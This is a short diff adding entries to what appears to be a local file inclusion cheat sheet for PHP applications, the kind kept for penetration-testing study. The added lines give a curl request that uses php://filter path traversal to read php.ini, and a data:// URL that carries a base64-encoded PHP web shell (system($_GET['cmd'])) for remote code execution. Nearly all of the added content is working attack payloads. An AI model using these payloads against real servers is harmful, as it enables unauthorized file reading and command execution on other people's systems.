@@ -49,6 +49,12 @@ Command 	Description
 Convert file to Base64
 php://filter/read=convert.base64-encode/
 
+PHP cofiguration file where X.Y is version of php
+curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/X.Y/apache2/php.ini"
+
+If parameter allow_url_include = On ,after cheacking a config file. php RCE payload <?php system($_GET["cmd"]); ?> encoded into base64
+http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+
 File Inclusion Functions
 Function 	Read Content 	Execute 	Remote URL
 PHP 			
